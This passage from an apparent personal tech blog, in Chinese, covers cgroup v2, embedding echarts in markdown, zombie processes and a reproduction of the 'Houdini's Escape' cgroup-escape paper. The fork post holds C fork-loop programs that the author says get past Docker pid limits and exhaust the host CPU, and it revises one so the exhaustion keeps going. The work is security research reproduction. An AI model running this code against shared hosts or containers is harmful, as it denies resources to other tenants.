<h2 id="Cgroups-Version-2"><a href="#Cgroups-Version-2" class="headerlink" title="Cgroups Version 2"></a>Cgroups Version 2</h2><p>与 cgroup v1 不同的是，cgroup v2 的所有 controller 都位于同一个 hierarchy 中，在虚拟文件系统表示为同一个文件夹下。考虑到存在 cgroup v1 和 v2 共同使用的情况，不允许一个 controller 即属于 cgroup v1 又属于 v2。</p>
<p>cgroup v2 的新特性如下所示，部分需要重点描述的将会在后续当中详细说明</p>
<ol>
<li>Cgroup v2 为所有 mounted controllers 提供了一个共同的 hierarchy。</li>
<li><strong>Internal</strong> 进程不允许存在，简单的来说，除了 root cgroup 之外，所有的进程都只能绑定在 leaf nodes 上，所有既有 parent cgroup 又有 child cgroup 的 cgroup，都不能够有绑定的 process。具体的细节将会在后续给出。</li>
<li>有效的 cgroups 必须通过 <em>cgroup.controllers</em> 和 <em>cgroup.subtrss_control</em> 来描述。</li>
<li>原来存在于 cgroup 文件目录下的 <em>task</em> 文件被移除了，同时，为 cpuset controller 服务的 <em>cgroup.clone_children</em> 也被移除了。</li>
<li>之前提到的 Release Notification 机制，现在通过 <em>cgroup.events</em> 文件来实现。</li>
</ol>
<p>更多关于 cgroup v2 的具体信息可以参考 Linux source code 中的 <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/admin-guide/cgroup-v2.rst" target="_blank" rel="noopener"><code>cgroup-v2.rst</code></a> 文件。</p>
<p>另外在 Linux 4.14 引入了 <strong><em>thread mode</em></strong>，也会在后续当中详细说明。</p>
<h3 id="Unified-Hierarchy"><a href="#Unified-Hierarchy" class="headerlink" title="Unified Hierarchy"></a>Unified Hierarchy</h3><p>cgroup v1 之所以会让不同的 controllers 对应不同的 hierarchy，是因为想让应用的设计和开发更具灵活性，然而在实际的使用当中，非但没有增加灵活性，反而在很多情况里面增加了复杂度。因此在 cgroup v2 中移除了这个机制，所有支持 v2 的 controllers 被 mount 在了单一的 hierarchy 中。所有可用的 controllers 都会被自动挂载，也就意味着不需要（实际上也并不可能）通过以下语句去 mount controller</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> mount -t cgroup2 none /mnt/cgroup2</span></span><br></pre></td></tr></table></figure>

<p>只有当一个 controller 不属于 cgroup v1 的 hierarchy 的时候，它才可以被 mount。换句话说，就是一个 controller 不能同时属于 v1 和 v2。当我们（v2）需要使用正被 v1 使用的 controller 时，要先将它 unmount。然而由于一些进程如 <span class="exturl" data-url="aHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW4xL3N5c3RlbWQuMS5odG1saHR0cDovL21hbjcub3JnL2xpbnV4L21hbi1wYWdlcy9tYW4xL3N5c3RlbWQuMS5odG1s" title="http://man7.org/linux/man-pages/man1/systemd.1.htmlhttp://man7.org/linux/man-pages/man1/systemd.1.html">systemd(1)<i class="fa fa-external-link"></i></span> 会频繁的使用一些 v1 的 controllers，最好的做法是改写 system boot command line，添加 <code>cgroup_no_v1=list</code>，其中 <code>list</code> 是需要禁止 v1 使用的 controllers 集合，或者可以用 <code>all</code> 表示所有的 controllers 都不能被 v1 使用。systemd(1) 可以自动的处理这种情况，即不再使用这些 controllers。</p>
<p>事实上，现在许多现代操作系统里面，systemd(1) 自动 mount 了 cgroup2 file system，就位于根目录的 <code>/unified</code> 文件夹。在 <a href="#Terminology">Terminology</a> 一节中有显示出来。</p>
<h3 id="Controllers-1"><a href="#Controllers-1" class="headerlink" title="Controllers"></a>Controllers</h3><p>支持 cgroup v2 的 controller </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">io          # successor of the v1 blkio</span><br><span class="line">memory      # successor of the v1 memory</span><br><span class="line">pids        # same as the v1 pids</span><br><span class="line">perf_event  # same as the v1 perf_event</span><br><span class="line">rdma        # same as the v1 rdma</span><br><span class="line">cpu         # successor of v1 cpu and cpuacct</span><br></pre></td></tr></table></figure>

<p>具体可以参照官方文档的介绍 <a href="https://elixir.bootlin.com/linux/latest/source/Documentation/admin-guide/cgroup-v2.rst" target="_blank" rel="noopener"><code>cgroup-v2.rst</code></a>。</p>
<h3 id="Subtree-control"><a href="#Subtree-control" class="headerlink" title="Subtree control"></a>Subtree control</h3><p>每个 cgroup v2 的 hierarchy 都包S含了以下两个文件</p>
<ul>
<li><em>cgroup.controllers</em><ul>
<li>这是一个 read-only 文件，其中包含了对于该 cgroup available 的 controllers，它和 parent cgroup 目录当中的 cgroup.subtrr_control 文件内容相对应</li>
</ul>
</li>
<li><em>cgroup.subtree_control</em><ul>
<li>这是关于 active (enabled) controllers 的文件。这些 controllers 是 <em>cgroup.controllers</em> 文件当中 controllers 的一个子集，意思是不能够使用没有在 cgroup.controllers 文件当中声明的 controller。可以通过向文件写入 <code>+</code> 或 <code>-</code> 后面接上 controller 名字来 enable 或者 disable 特定的 controller，如下例子所示<ul>
<li><code>$ echo &#39;+pids -memory&#39; &gt; x/y/cgroup.subtrr_control</code></li>
</ul>
</li>
<li>如果想要 enable 的 controller 不在 <em>cgroup.controllers</em> 文件当中，那么在写入的时候会报错</li>
</ul>
</li>
</ul>
<p>因为所有在 <em>cgroup.subtree_control</em> 文件当中列出的 controllers 都是 <em>cgroup.controllers</em> 的子集，所以一旦一个 controller 在某个 cgroup 当中被禁用，那么在它的后续 subtree 当中是没有办法重新启用的。</p>
<p>在 <em>cgroup.subtree_control</em> 文件中列出的 controller 将会在 child cgroup 当中使用，所以在一旦 controller 被添加到  <em>cgroup.subtree_control</em> 文件中，child cgroup 目录将会自动添加 controller 对应的 interface 文件，比如 <em>pids.max</em> 等。这些文件可以被 child cgroup 用来做特定的资源限制。</p>
<h3 id="quot-no-internal-processes-quot-rule"><a href="#quot-no-internal-processes-quot-rule" class="headerlink" title="&quot;no internal processes&quot; rule"></a>&quot;no internal processes&quot; rule</h3>]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>cgroup</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Use echarts in markdown</title>
    <url>/2019/10/22/echarts-in-markdown/</url>
    <content><![CDATA[<p>通过<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzM4OTMxNjY4L2Fuc3dlci8yNTI0MTYzMzQ=" title="https://www.zhihu.com/question/38931668/answer/252416334">知乎<i class="fa fa-external-link"></i></span>我了解到了 <span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNoYXJ0c2pzLmNvbS96aC9pbmRleC5odG1s" title="https://www.echartsjs.com/zh/index.html">echarts<i class="fa fa-external-link"></i></span> 这款可视化工具，相比于我之前接触到的一些图表 api 如 python 的 matplotlib，它的文档更加的全面，上手也很快。</p>
<p>具体的细节我就不再赘述，在这里我简要介绍一下，如何在编写 markdown 文档的时候，插入 html 代码，利用 echarts API 来进行图表绘制。</p>
<p>文中的代码适用于基于 hexo 部署的个人博客。</p>
<a id="more"></a>

<h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p>首先是下载 echarts，官方提供了三种下载方式</p>
<ul>
<li>npm 安装，运行 <code>npm install echarts</code></li>
<li>下载发布版本的编译产物，或下载源代码</li>
<li>选择需要的模块，在线定制下载</li>
</ul>
<p>具体的操作详见<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNoYXJ0c2pzLmNvbS96aC9kb3dubG9hZC5odG1s" title="https://www.echartsjs.com/zh/download.html">官方下载页面<i class="fa fa-external-link"></i></span>。</p>
<p>这里需要说明的是，第一种方法即用 npm 来下载，会下载源代码，具体文件的格式我不清楚，但一定包含了所有相关的内容。我一开始使用的是第三种，非常的方便，只要选择自己需要的模块，官方会根据你的需求自动化生成一个较为精简的 json 文档，只需要引入该文档即可。</p>
<p>我最后为了后续开发方便，使用了第二种方法，下载了发布版本的编译文档，即一系列的 json 文件。</p>
<h3 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h3><p>之前说到我是为了能够在 markdown 当中添加图表。其实说的不够准确，应该是在 github.io 个人网站上应用。编辑的文档通过 <span class="exturl" data-url="aHR0cDovL2pla3lsbGNuLmNvbS8=" title="http://jekyllcn.com/">jekyll<i class="fa fa-external-link"></i></span> 将 markdown 文档构建为 html 静态网页。</p>
<ul>
<li>更新于2020年3月6日<br>我已经把个人 blog 换成了 hexo 下的 NexT 主题，因此只需要把 echarts 生成的 <code>echarts.min.js</code> 放到 <code>web/source/js/</code> 目录下，然后在 markdown 中引入即可。</li>
</ul>
<p>因此，要在用 markdown 写成的 blog 文档添加 echarts 图表，只要插入 html 代码即可。我尝试了一下，在使用 <span class="exturl" data-url="aHR0cHM6Ly93d3cudHlwb3JhLmlvLw==" title="https://www.typora.io/">Typora<i class="fa fa-external-link"></i></span> 作为 Markdown 编辑器，用 jekyll 来将 markdown 文档转化为 html 的情景下，可以直接在文档中插入 html 代码，实现 echarts 图表的绘制。</p>
<p>下图即是在文档中插入代码之后绘制的图表，建议直接用 <span class="exturl" data-url="aHR0cHM6Ly9jb2RlLnZpc3VhbHN0dWRpby5jb20v" title="https://code.visualstudio.com/">vscode<i class="fa fa-external-link"></i></span> 这类编辑器插入，若是使用标准的 markdown 编辑器，会出现 html 代码外套标签导致无法正常显示图片。</p>
<div id="container" style="weight:80%; height: 600px"></div>
<script type="text/javascript" src="/js/echarts.min.js"></script>
<script type="text/javascript">
var dom = document.getElementById("container");
var myChart = echarts.init(dom);
var app = {};
option = null;
option = {
    xAxis: {
        type: 'category',
        data: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun']
    },
    yAxis: {
        type: 'value'
    },
    series: [{
        data: [120, 200, 150, 80, 70, 110, 130],
        type: 'bar'
    }]
};
;
if (option && typeof option === "object") {
    myChart.setOption(option, true);
}
</script>


<p>上图的代码如下所示</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span> <span class="attr">style</span>=<span class="string">"weight:80%; height: 600px"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"/js/dist/echarts.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> dom = <span class="built_in">document</span>.getElementById(<span class="string">"container"</span>);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> myChart = echarts.init(dom);</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> app = &#123;&#125;;</span></span><br><span class="line"><span class="actionscript">option = <span class="literal">null</span>;</span></span><br><span class="line">option = &#123;</span><br><span class="line">    xAxis: &#123;</span><br><span class="line"><span class="actionscript">        type: <span class="string">'category'</span>,</span></span><br><span class="line"><span class="actionscript">        data: [<span class="string">'Mon'</span>, <span class="string">'Tue'</span>, <span class="string">'Wed'</span>, <span class="string">'Thu'</span>, <span class="string">'Fri'</span>, <span class="string">'Sat'</span>, <span class="string">'Sun'</span>]</span></span><br><span class="line">    &#125;,</span><br><span class="line">    yAxis: &#123;</span><br><span class="line"><span class="actionscript">        type: <span class="string">'value'</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    series: [&#123;</span><br><span class="line">        data: [120, 200, 150, 80, 70, 110, 130],</span><br><span class="line"><span class="actionscript">        type: <span class="string">'bar'</span></span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;;</span><br><span class="line">;</span><br><span class="line"><span class="actionscript"><span class="keyword">if</span> (option &amp;&amp; <span class="keyword">typeof</span> option === <span class="string">"object"</span>) &#123;</span></span><br><span class="line"><span class="actionscript">    myChart.setOption(option, <span class="literal">true</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中，引入的各类 .js 文件，来源于下载的 echarts 编译后的 .js 文件，在下载页面有详细的说明，这之中有一些在软件包中没有的，比如 echarts-gl.min.js 文件，需要自己下载并放到项目的目录中去。</p>
<p><strong>注意：插入 markdown 文件当中的代码，可以由官方实例的预览网页直接生成，且插入时不需要消除换行符和格式。</strong></p>
<p>这些代码并非是我自己编写的，而是来源于 echarts 的<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNoYXJ0c2pzLmNvbS9leGFtcGxlcy96aC9lZGl0b3IuaHRtbD9jPWJhci1uZWdhdGl2ZQ==" title="https://www.echartsjs.com/examples/zh/editor.html?c=bar-negative">官方实例<i class="fa fa-external-link"></i></span>，还有许多的实例可以参考，绘制图表的时候只需要在实例上进行改动即可。</p>
<p>若要改动图表的格式、内容等一系列元素，参考官方的<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNoYXJ0c2pzLmNvbS96aC9vcHRpb24uaHRtbA==" title="https://www.echartsjs.com/zh/option.html">配置项手册<i class="fa fa-external-link"></i></span>即可。</p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ol>
<li>Echarts 官方网站：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNoYXJ0c2pzLmNvbS96aC9pbmRleC5odG1s" title="https://www.echartsjs.com/zh/index.html">https://www.echartsjs.com/zh/index.html<i class="fa fa-external-link"></i></span></li>
<li>Echarts 官方实例：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNoYXJ0c2pzLmNvbS9leGFtcGxlcy96aC9pbmRleC5odG1s" title="https://www.echartsjs.com/examples/zh/index.html">https://www.echartsjs.com/examples/zh/index.html<i class="fa fa-external-link"></i></span></li>
<li>Echarts 配置项手册：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNoYXJ0c2pzLmNvbS96aC9vcHRpb24uaHRtbA==" title="https://www.echartsjs.com/zh/option.html">https://www.echartsjs.com/zh/option.html<i class="fa fa-external-link"></i></span></li>
<li>Echarts cheat sheet 快速定位配置项：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZWNoYXJ0c2pzLmNvbS96aC9jaGVhdC1zaGVldC5odG1s" title="https://www.echartsjs.com/zh/cheat-sheet.html">https://www.echartsjs.com/zh/cheat-sheet.html<i class="fa fa-external-link"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>Visualization</category>
      </categories>
      <tags>
        <tag>echarts</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Totally Delete Child Process</title>
    <url>/2019/10/21/fork-in-c/</url>
    <content><![CDATA[<h3 id="problem-in-fork"><a href="#problem-in-fork" class="headerlink" title="problem in fork()"></a>problem in fork()</h3><p>我在进行 <a href="https://tianyuzhou.top/2019/10/18/cgroups-escape/">cgroup escape 实验</a>的时候，发现 exploit 程序不同写法会导致不同的结果。</p>
<a id="more"></a>

<p>具体的代码如下所示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid &gt; <span class="number">0</span>) &#123;	<span class="comment">// in father process</span></span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;	<span class="comment">// make div 0 fault</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码做了几件事</p>
<ul>
<li>生成子进程，然后父进程自己触发 core dump</li>
<li>子进程继续生成孙子进程，子进程再触发 core dump</li>
<li>子子孙孙都如上进行先 <code>fork()</code> 再 <code>int i = 1/0</code> 的操作</li>
</ul>
<p>上面的程序，即使在运行 docker container 的时候加上了 pid 的限制，依旧可以实现 cgroup escape，即占满 Host 的 cpu 资源。从结果上看，即 fork 操作是一直在进行的。</p>
<p>然而如果<strong>换了一种写法</strong>，结果将大不相同</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pid = fork();</span><br><span class="line">            <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;	<span class="comment">// in child process</span></span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;	<span class="comment">// make div 0 fault</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里仅仅将判断条件改为了 <code>pid == 0</code>，目的是将执行逻辑改变，现在仅由父进程来进行 <code>fork()</code> 操作，子进程来进行 <code>i = 1/0</code> 操作触发 core dump。按照我的设想，这两个程序的功能是一致的，子进程触发 core dump 之后直接终止，因此父进程可以在子进程资源释放之后再次进行 <code>fork()</code> 操作（如果当前运行进程已经达到 cgroup 限制）。</p>
<p>但是从结果上看，在父进程 <code>fork()</code> 出达到限制的进程数目之后，即使子进程已经终止，父进程依然无法 <code>fork()</code> 出新的进程。</p>
<p>我设法找到了那些我认为已经释放资源的子进程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">834 pts&#x2F;0    00:00:00 do-div0</span><br><span class="line">835 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br><span class="line">836 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br><span class="line">837 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br><span class="line">838 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br><span class="line">839 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br><span class="line">840 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br><span class="line">843 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br><span class="line">846 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br><span class="line">848 pts&#x2F;0    00:00:00 do-div0 &lt;defunct&gt;</span><br></pre></td></tr></table></figure>

<p>可以发现虽然子进程已经终止，但是在 ps 命令执行的时候依然可以被找到，那么在 cgroup 对 pid 进行限制的情况下，<code>fork()</code> 自然不能正常进行。</p>
<h3 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h3><blockquote>
<p>At the termination of the child, a ‘SIGCHLD’ signal is generated which is delivered to the parent by the kernel. Parent, on receipt of ‘SIGCHLD’ reaps the status of the child from the process table. </p>
</blockquote>
<p>子进程终止的时候会给父进程发送 <code>SIGCHLD</code> 信号，而父进程可以根据在进程表当中获取子进程的状态信息。</p>
<blockquote>
<p>Even though the child is terminated, there is an entry in the process table corresponding to the child where the status is stored. When parent collects the status, this entry is deleted. Thus, all the traces of the child process are removed from the system. </p>
</blockquote>
<p>因此即使这个子进程终止了，在进程表当中依然会有相关的信息（pid 和 status）保存，只有当父进程收集了这些信息（通过 wait 或者是 waitpid）之后，这些信息才会被删除，进而子进程相关的 traces 也会从操作系统当中移除。</p>
<blockquote>
<p>If the parent decides not to wait for the child’s termination and it executes its subsequent task, then at the termination of the child, the exit status is not read. Hence, there remains an entry in the process table even after the termination of the child. This state of the child process is known as the Zombie state.</p>
</blockquote>
<p>若是父进程并没有收集这些信息，那么子进程的信息将会一直保留，如同上文当中通过 ps 命令找到的那样，依然可以在 process table 当中被找到，只是将会是 defunct 状态，也叫作“僵尸进程”。</p>
<p>要是父进程先于子进程结束，那么它的子进程就会称为 <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvT3JwaGFuX3Byb2Nlc3M=" title="https://en.wikipedia.org/wiki/Orphan_process">orphan process<i class="fa fa-external-link"></i></span>，在 unix-like 的操作系统当中，这个进程会被 PID 为 1 的 init 进程收养。</p>
<h3 id="Handle"><a href="#Handle" class="headerlink" title="Handle"></a>Handle</h3><p>对于之前碰到问题的程序，可以有以下两种改进方式</p>
<ul>
<li>循环 wait() 所有子进程，即收集了子进程的 status 信息</li>
<li>ignore 子进程发送的 <code>SIGCHLD</code> 信号，在这种情况下，子进程在 process table 上的 entry 会被直接删除，但缺点是父进程就不会知道子进程的退出状态</li>
</ul>
<p>下面是对于应用第二种方法之后的代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/wait.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        signal(SIGCHLD,SIG_IGN);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即在父进程创建子进程之后，ignore 子进程的信号。这时，子进程的信息会在信号被 ignore 之后直接删除，然后父进程就可以再创建新的子进程，最终实现 cpu 资源的持续消耗。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li>父进程等待子进程结束：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbmdib2RvbmcyMjAxMS9hcnRpY2xlL2RldGFpbHMvNDk3NDEwMjc=" title="https://blog.csdn.net/yangbodong22011/article/details/49741027">https://blog.csdn.net/yangbodong22011/article/details/49741027<i class="fa fa-external-link"></i></span></li>
<li>Zombie Processes and their Prevention: <span class="exturl" data-url="aHR0cHM6Ly93d3cuZ2Vla3Nmb3JnZWVrcy5vcmcvem9tYmllLXByb2Nlc3Nlcy1wcmV2ZW50aW9uLw==" title="https://www.geeksforgeeks.org/zombie-processes-prevention/">https://www.geeksforgeeks.org/zombie-processes-prevention/<i class="fa fa-external-link"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>Linux Kernel</category>
      </categories>
      <tags>
        <tag>c</tag>
        <tag>linux</tag>
        <tag>fork</tag>
      </tags>
  </entry>
  <entry>
    <title>cgroup - Houdini&#39;s escape</title>
    <url>/2019/10/18/cgroups-escape/</url>
    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Linux Control Group，也称为 cgroups，是用于监控、限制 process 资源的一种 Linux kernel feature[^note1]。它同时也时操作系统级别容器化的重要组成模块。它将进程划分到多个分层的组，同时为这些组提供资源控制器，从而管理 CPU，内存还有块设备的输入输出。当创建子进程的时候，该子进程会自动从他的创建者那里拷贝 cgroup 属性，从而强制实行资源控制。然而，在创建进程的时候从父进程继承 cgroup 约束并不是万无一失的，有时候一致性和资源合理分配并不能很好的保持。</p>
<p>本文介绍的就是一种 cgroup escaping 的方法，被作者称之为 Houdini’s Escape，<span class="exturl" data-url="aHR0cHM6Ly9nenM3MTUuZ2l0aHViLmlvL3B1YnMvSE9VRElOSV9DQ1MxOS5wZGY=" title="https://gzs715.github.io/pubs/HOUDINI_CCS19.pdf">这篇论文<i class="fa fa-external-link"></i></span>[^note2] 被 <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2lnc2FjLm9yZy9jY3MvQ0NTMjAxOS8=" title="https://www.sigsac.org/ccs/CCS2019/">CCS 2019<i class="fa fa-external-link"></i></span> 会议[^note3] 录用。</p>
<a id="more"></a>

<p>论文主要针对之前提到的子进程 cgroup 进行攻击，使得该子进程脱离父进程的 cgroup 类别，从而进行 ou-of-band 攻击，使得同一物理机上的其他 container 的运行受到影响，同时还可以获得更多的资源（超出它本应该获得的范围）。我撰写该 blog 的目的是在于复现该论文的 esacape 方法，同时总结这些方法的特性和推广的价值。</p>
<h2 id="Cgroups-Hierarchy-and-Controllers"><a href="#Cgroups-Hierarchy-and-Controllers" class="headerlink" title="Cgroups Hierarchy and Controllers"></a>Cgroups Hierarchy and Controllers</h2><blockquote>
<p>In Linux, cgroups are organized in a hierarchical structure where a set of cgroups are arranged in a tree. Each task (e.g., a thread) can only be associated with exactly one cgroup in one hierarchy, but can be a member of multiple cgroups in different hierarchies. Each hierarchy then has one or more subsystems attached to it, so that a resource controller can apply per-cgroup limits on specific system resources. With the hierarchical structure, the cgroups mechanism is able to limit the total amount of resources for a group of processes(e.g., a container).</p>
</blockquote>
<p>上述是关于 cgroup 的架构介绍，重要的有以下几点</p>
<ul>
<li>一个 cgroup 对应有一种 hierarchy</li>
<li>一个 task 在同类 hierarchy 中只能对应一个 cgroup</li>
<li>一个 task 可以有多个 cgroups</li>
<li>resource controller 按照 cgroup 来进行具体资源的管控</li>
</ul>
<p>Cgroup 相关的 resource controller 一共有四种</p>
<ul>
<li><strong>cpu controller</strong>：在多个 cgroup 竞争 cpu 资源的时候，按照 cpu share 的值来按比例分配 cpu 资源，也可以通过设定 <em>quota</em> 和 <em>period</em> 来限制在固定周期内的 cpu 使用量</li>
<li><strong>cpusets controller</strong>：将 task 限制在具体的 cpu core 和 memory node 上</li>
<li><strong>blkio controller</strong>：控制和限制对于块设备的访问，可以通过设定 <em>blkio.weight</em> 来划分占用比例，也可以通过设置具体的上限</li>
<li><strong>pid controller</strong>：为 container 设置 task number 上限，上限存放在 <em>pids.max</em> 中，当前的 task 数目统计放在 <em>pids.current</em> 中，一旦达到上线，所有的 fork 和 clone 操作都会被禁止</li>
</ul>
<h2 id="Cgroups-Inheritance"><a href="#Cgroups-Inheritance" class="headerlink" title="Cgroups Inheritance"></a>Cgroups Inheritance</h2><blockquote>
<p>One important feature of cgroups is that child processes inherit cgroups attributes from their parent processes. </p>
</blockquote>
<p>子进程被创建时，会调用 fork() 或是 clone() 函数，一开始新创建的进程会 attach 到 root cgroup 上，在完成寄存器还有其他的进程环境拷贝之后，将会调用 cgroup 拷贝函数，将这个新创建的进程 attach 到创建它的父进程所属的 cgroups。</p>
<blockquote>
<p>Particularly, the function attaches the task to its parent cgroups by recursively going through all cgroup subsystems. As a result, after the copying procedure, the child task inherits memberships to the exact same cgroups as its parent task.</p>
</blockquote>
<p>这个 cgroup 拷贝函数会把所有 cgroup subsystem 递归遍历一遍，最终实现将子进程的 cgroup 设置为和父进程完全一致。</p>
<p>举例来说，如果 cpusets 资源控制器将父进程指定为 2 号 cpu core，那么创建的子进程也会被指定为只能在 2 号 cpu core 上面运行。同时，如果 cpu 资源控制器对父进程设置了 <em>quota</em> 和 <em>period</em>，那么新创建的子进程将会和父进程共享这些资源，即子进程和父进程的 cpu 使用量加起来不能超过 <em>quota</em>。</p>
<h2 id="Exploiting-Strategies"><a href="#Exploiting-Strategies" class="headerlink" title="Exploiting Strategies"></a>Exploiting Strategies</h2><h2 id="Cases-Reccurent"><a href="#Cases-Reccurent" class="headerlink" title="Cases Reccurent"></a>Cases Reccurent</h2><blockquote>
<p>We use the Docker container to set the configuration of cgroups through the provided interfaces. Besides, Docker also ensures that containers are isolated through namespaces bydefault. </p>
<p>Especially, with the USER namespace enabled, the root user in a container is mapped to a non-privileged user on the host. Thus, the privileged operations within containers cannot affect the host kernel. Our case studies are conducted in such de-privileged containers.</p>
</blockquote>
<h3 id="Case-1-Exception-Handling"><a href="#Case-1-Exception-Handling" class="headerlink" title="Case 1: Exception Handling"></a>Case 1: Exception Handling</h3><p><strong>constrains</strong></p>
<ul>
<li>cpu core: 1</li>
<li>cpu share: 100%, 10%, 5%</li>
<li>pid limitation: None, 100, 50</li>
</ul>
<p><strong>method</strong></p>
<p>首先确保安装了 docker[^note4] 并且下载了 ubuntu 镜像。若没有下载，在第一次运行该镜像时会自动下载。</p>
<p>接下来明确 docker run 的参数以及观察 cpu 使用情况时用到的工具。</p>
<p>docker run 语句如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> docker run --cpuset-cpus=<span class="string">"0"</span> --cpus=0.1 --pids-limit=50 -v /home/zty/dev/cfile:/tmp/cfile --rm -it ubuntu</span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里没有像论文里说的那样用 user namespace 来实现非 root，考虑后续实现</li>
